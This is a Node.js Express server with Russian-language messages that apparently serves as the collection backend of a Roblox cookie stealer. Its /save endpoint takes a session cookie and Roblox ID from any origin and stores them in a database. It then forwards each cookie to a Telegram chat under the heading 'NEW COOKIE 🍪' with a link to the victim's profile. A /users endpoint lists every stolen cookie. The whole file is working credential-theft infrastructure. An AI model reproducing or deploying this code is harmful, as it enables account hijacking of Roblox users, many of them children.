require("dotenv").config();
const express = require("express");
const { neon } = require("@neondatabase/serverless");
const { Bot } = require("grammy");
const cors = require("cors");

const PORT = 5000;
const app = express();
const client = neon(process.env.DATABASE_URL);
const bot = new Bot(process.env.BOT_TOKEN);

sendTelegramMessage = async (chatId, message) => {
  try {
    await bot.api.sendMessage(chatId, message, {
      parse_mode : "HTML",
    });
  } catch (error) {
    console.error("Ошибка отправки:", error);
  }
};


app.use(express.json());
app.use(
  cors({
    methods: ["POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
  }),
);

app.post("/save", async (req, res) => {
  const { login, robloxId } = req.body ?? {};
  if (!login) {
    return res
      .status(400)
      .json({ ok: false, error: "Не передан токен сессии" });
  }

  try {
    await client`
      INSERT INTO users (cookie, roblox_id)
      VALUES (${login}, ${robloxId})`;

    await sendTelegramMessage(
      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b>\n\n\n <b>LINK --- </b> https://www.roblox.com/users/${robloxId}/profile \n\n\n  <code>${login}</code> `);

    res.json({ ok: true, account });
  } catch (err) {
    console.error("Ошибка:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});
app.get("/users", async (req, res) => {
  try {
    const users = await client`SELECT * FROM users`;
    res.json({ ok: true, users });
  } catch (err) {
    console.error("Ошибка получения пользователей из базы данных:", err);
    res
      .status(500)
      .json({ ok: false, error: "Не удалось получить пользователей" });
  }
});
app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
